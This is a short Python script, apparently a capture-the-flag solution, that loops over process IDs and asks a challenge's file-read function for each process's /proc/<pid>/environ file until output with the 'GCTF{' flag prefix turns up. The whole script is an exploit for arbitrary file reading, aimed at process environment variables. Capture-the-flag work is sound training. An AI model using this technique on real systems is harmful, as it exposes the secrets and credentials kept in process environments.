#!/usr/bin/env python3

from gaia import *;

if __name__ == '__main__':
	for pid in range(0, 10000):
		filename = f",/proc/{pid}/environ"
		result = attempt(86, filename)
		if "GCTF{" in result:
			print(filename, result)
			quit()

		if "File does not exist!" in result:
			print(filename, "doesn't exist")
			continue

		print(filename, "is empty")
